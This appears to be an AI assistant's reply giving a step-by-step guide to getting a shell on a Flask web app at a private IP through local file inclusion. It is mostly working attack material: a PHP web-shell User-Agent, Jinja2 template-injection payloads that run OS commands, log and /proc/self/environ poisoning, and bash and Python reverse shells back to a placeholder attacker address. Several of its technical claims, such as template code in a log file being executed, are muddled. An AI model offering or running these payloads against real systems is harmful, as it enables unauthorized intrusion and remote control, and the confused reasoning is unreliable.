Shell on this Flask app with LFI:

## Step-by-Step Shell via Log Poisoning

### **Method 1: Nginx Access Log Poisoning** (Most likely to work)

**Step 1:** Poison the log with Python code
```bash
curl -A "<?php system(\$_GET['c']); ?>" http://192.168.203.14/
```

Wait, Flask = **Python**, not PHP! Use this:

```bash
# Send request with Python payload in User-Agent
curl -A "{{request.application.__globals__.__builtins__.__import__('os').popen(request.args.get('c')).read()}}" http://192.168.203.14/
```

**Step 2:** Trigger execution
```
http://192.168.203.14/view_file?file=/var/log/nginx/access.log&c=whoami
```

### **Method 2: /proc/self/environ Poisoning**

**Step 1:** Poison environment
```bash
curl -A "{{request.application.__globals__.__builtins__.__import__('os').popen(request.args.get('c')).read()}}" http://192.168.203.14/
```

**Step 2:** Include environ
```
http://192.168.203.14/view_file?file=/proc/self/environ&c=id
```

### **Method 3: Direct RCE via Template Injection (if rendering)**

If the app is rendering the file content, try SSTI:
```
http://192.168.203.14/view_file?file=/etc/passwd{{7*7}}
```

If you see `49`, try:
```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### **Get Reverse Shell:**

Once command execution works:

```bash
# On your machine:
nc -lvnp 4444

# In the LFI (URL encode this):
bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'

# Or Python reverse shell:
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

